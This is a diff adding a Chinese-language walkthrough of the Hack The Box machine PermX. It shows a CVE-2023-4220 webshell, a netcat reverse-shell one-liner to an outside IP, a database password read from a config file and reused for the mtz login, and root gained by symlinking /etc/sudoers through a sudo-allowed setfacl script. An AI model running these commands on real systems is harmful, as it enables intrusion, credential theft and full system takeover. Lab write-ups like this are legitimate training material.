@@ -91,7 +91,7 @@ team页面有4个人名
 - Mia
 
 
-# vhos爆破
+# vhost爆破
 
 ```-mc 200```只显示http状态码是200的结果
 ```
@@ -219,3 +219,171 @@ Disallow: /README.txt
 Disallow: /whoisonline.php
 Disallow: /whoisonlinesession.php
 ```
+
+# foothold
+
+经过一番搜索，使用[CVE-2023-4220](https://github.com/insomnia-jacob/CVE-2023-4220-)
+
+[漏洞详情](https://nvd.nist.gov/vuln/detail/CVE-2023-4220)
+
+得到一个webshell
+
+![](PermX_files/2.jpg)
+
+![](PermX_files/3.jpg)
+
+
+
+下面payload得到一个rev shell
+
+```
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.21 4242 >/tmp/f
+```
+
+
+找到数据库密码:03F6lY3uXAP2bkW8
+```
+www-data@permx:/tmp/max$ cat /var/www/chamilo/app/config/configuration.php |grep db_
+</www/chamilo/app/config/configuration.php |grep db_
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+$_configuration['db_manager_enabled'] = false;
+//$_configuration['session_stored_in_db_as_backup'] = true;
+//$_configuration['sync_db_with_schema'] = false;
+
+```
+
+
+user表
+```
+MariaDB [chamilo]> select user_id,username,email,password from user;
+select user_id,username,email,password from user;
++---------+----------+-----------------------+--------------------------------------------------------------+
+| user_id | username | email                 | password                                                     |
++---------+----------+-----------------------+--------------------------------------------------------------+
+|       1 | admin    | admin@permx.htb       | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |
+|       2 | anon     | anonymous@example.com | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |
++---------+----------+-----------------------+--------------------------------------------------------------+
+2 rows in set (0.000 sec)
+
+
+```
+
+这个数据库密码也是mtz的用户密码：
+```
+www-data@permx:/tmp/max$ su mtz
+su mtz
+Password: 03F6lY3uXAP2bkW8
+
+mtz@permx:/tmp/max$ id
+id
+uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
+
+```
+
+
+拿到user.txt
+```
+┌──(root㉿kali)-[~/htb/permax]
+└─# ssh mtz@10.10.11.23         
+The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
+ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
+...
+Last login: Tue Jul  9 07:22:01 2024 from 10.10.14.32
+mtz@permx:~$ ls
+setfacl  test.txt  user.txt
+mtz@permx:~$ cat user.txt
+09dc763ecb0a18855643a6bf8ec23b11
+mtz@permx:~$ 
+
+```
+
+# 提权
+
+sudo 特权
+
+```
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+
+```
+
+acl.sh
+```
+mtz@permx:~$ cat /opt/acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+
+```
+我们可以尝试修改 /etc/sudoers 文件的权限，使当前用户 mtz 可以编辑它。这将允许我们添加具有所有权限的条目。
+
+首先，创建一个软链接指向 /etc/sudoers 文件：
+
+```
+ln -s /etc/sudoers /home/mtz/sudoers_link
+```
+
+然后，使用 acl.sh 脚本为 mtz 用户赋予对该软链接的写权限：
+
+```
+sudo /opt/acl.sh mtz rw /home/mtz/sudoers_link
+```
+此时，mtz 用户应该有权编辑 /etc/sudoers 文件。我们可以使用文本编辑器来编辑该文件：
+
+```
+vi /home/mtz/sudoers_link
+```
+在文件中添加以下行以授予 mtz 用户所有权限：
+
+```
+mtz ALL=(ALL) NOPASSWD:ALL
+```
+保存并退出编辑器。现在，mtz 用户可以在不输入密码的情况下使用 sudo 执行任何命令：
+
+```
+sudo bash
+```
+
+这将为 mtz 用户提供一个 root shell。
+
+```
+mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers_link
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers_link
+mtz@permx:~$ vi /home/mtz/sudoers_link
+mtz@permx:~$ sudo bash
+root@permx:/home/mtz# ls /root
+backup  reset.sh  root.txt
+root@permx:/home/mtz# cat /root/root.txt 
+3b5caa2eca267399dffef7f1ac372abe
+root@permx:/home/mtz# 
+
+```
+
+![](PermX_files/4.jpg)
